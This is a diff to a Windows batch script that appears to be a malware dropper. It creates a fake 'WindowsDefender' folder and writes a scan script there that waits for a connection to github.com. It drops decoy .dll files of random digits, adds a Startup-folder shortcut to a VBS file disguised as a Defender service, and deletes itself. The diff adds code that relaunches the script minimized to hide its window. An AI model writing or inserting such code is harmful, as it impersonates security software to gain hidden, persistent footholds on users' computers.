@@ -1,4 +1,5 @@
 @echo off
+if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
 if exist "%userprofile%\WindowsDefender" rmdir "%userprofile%\WindowsDefender"
 md "%userprofile%\WindowsDefender"
 echo powershell -command "do {$ping = test-connection -comp github.com -count 1 -Quiet} until ($ping)" > "%userprofile%\WindowsDefender\WindowsDefenderScan.bat"
@@ -20,4 +21,4 @@ echo %random%%random%%random%%random% > "%userprofile%\WindowsDefender\WindowsDe
 echo %random%%random%%random%%random% > "%userprofile%\WindowsDefender\WindowsDefenderServicesUpdates.dll"
 echo %random%%random%%random%%random% > "%userprofile%\WindowsDefender\WindowsDefenderServicesBackground.dll"
 mklink "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender Services.lnk" "%userprofile%\WindowsDefender\WindowsDefenderBackgroundServices.vbs" >nul 2>&1
-del %0
+del %0 & exit
